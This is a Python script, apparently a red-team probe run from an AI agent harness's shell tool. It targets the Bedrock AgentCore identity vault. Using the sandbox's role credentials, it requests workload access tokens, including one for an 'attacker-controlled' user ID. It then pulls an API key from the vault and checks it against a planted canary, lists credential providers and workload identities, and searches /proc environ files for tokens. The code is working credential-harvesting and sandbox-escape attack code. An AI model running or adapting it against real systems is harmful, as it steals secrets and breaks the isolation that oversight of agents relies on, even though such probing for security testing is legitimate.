"""Identity vault probe — runs inside the harness shell tool's Python.

Targets:
  - GetWorkloadAccessToken using IMDS exec_role creds
  - GetResourceApiKey using the workload token
  - Control-plane list APIs (list_api_key_credential_providers, etc.)
  - /proc/1/environ + /proc/self/environ for any AWS_WORKLOAD_ACCESS_TOKEN
"""
import json
import os
import sys
import urllib.request

import boto3
import botocore
from botocore.config import Config as BC


REGION = 'us-east-1'
WORKLOAD_NAME = 'acab088-vault-probe-wi'
PROVIDER_NAME = 'acab088-vault-probe-apikey'
APIKEY_CANARY = 'IDENT-APIKEY-CANARY-9F3E2B1A-DO-NOT-USE'


def section(title):
    print('=== ' + title + ' ===')


cfg = BC(read_timeout=30, connect_timeout=10, retries={'max_attempts': 1})
dp = boto3.client('bedrock-agentcore', region_name=REGION, config=cfg)
control = boto3.client('bedrock-agentcore-control', region_name=REGION, config=cfg)
sts = boto3.client('sts', region_name=REGION, config=cfg)

print('boto3 ' + boto3.__version__ + ', botocore ' + botocore.__version__)

section('STS_CALLER')
try:
    print(sts.get_caller_identity())
except Exception as e:
    print('sts err: ' + str(e))

section('GetWorkloadAccessToken')
workload_token = None
try:
    wat = dp.get_workload_access_token(workloadName=WORKLOAD_NAME)
    workload_token = wat.get('workloadAccessToken') or wat.get('token')
    if workload_token:
        print('  TOKEN len=' + str(len(workload_token))
              + ' head=' + workload_token[:40] + '...')
    else:
        print('  no token in response: ' + str(wat))
except Exception as e:
    print('  ERR: ' + type(e).__name__ + ': ' + str(e))

section('GetResourceApiKey')
if workload_token:
    try:
        rk = dp.get_resource_api_key(
            workloadIdentityToken=workload_token,
            resourceCredentialProviderName=PROVIDER_NAME,
        )
        api_key = rk.get('apiKey') or rk.get('credentialValue') or rk.get('value')
        match = (api_key == APIKEY_CANARY)
        print('  api_key: ' + repr(api_key))
        print('  matches planted canary: ' + str(match))
    except Exception as e:
        print('  ERR: ' + type(e).__name__ + ': ' + str(e))
else:
    print('  skipped — no workload token')

section('GetWorkloadAccessTokenForUserId')
try:
    wat2 = dp.get_workload_access_token_for_user_id(
        workloadName=WORKLOAD_NAME,
        userId='attacker-controlled',
    )
    print('  ' + str(wat2)[:200])
except Exception as e:
    print('  ERR: ' + type(e).__name__ + ': ' + str(e))

section('list_api_key_credential_providers')
try:
    res = control.list_api_key_credential_providers()
    print(json.dumps(res, default=str, indent=2)[:1000])
except Exception as e:
    print('  ERR: ' + type(e).__name__ + ': ' + str(e))

section('list_workload_identities')
try:
    res = control.list_workload_identities()
    print(json.dumps(res, default=str, indent=2)[:1000])
except Exception as e:
    print('  ERR: ' + type(e).__name__ + ': ' + str(e))

section('list_oauth2_credential_providers')
try:
    res = control.list_oauth2_credential_providers()
    print(json.dumps(res, default=str, indent=2)[:1000])
except Exception as e:
    print('  ERR: ' + type(e).__name__ + ': ' + str(e))

section('proc_environ_workload')
try:
    with open('/proc/1/environ', 'rb') as f:
        env = f.read().decode(errors='replace').split('\x00')
    hits = [e for e in env if 'WORKLOAD' in e.upper() or 'TOKEN' in e.upper()]
    print('  pid1: ' + str(hits))
    with open('/proc/self/environ', 'rb') as f:
        env2 = f.read().decode(errors='replace').split('\x00')
    hits2 = [e for e in env2 if 'WORKLOAD' in e.upper() or 'TOKEN' in e.upper()]
    print('  self: ' + str(hits2))
except Exception as e:
    print('  ERR: ' + str(e))

section('DONE')
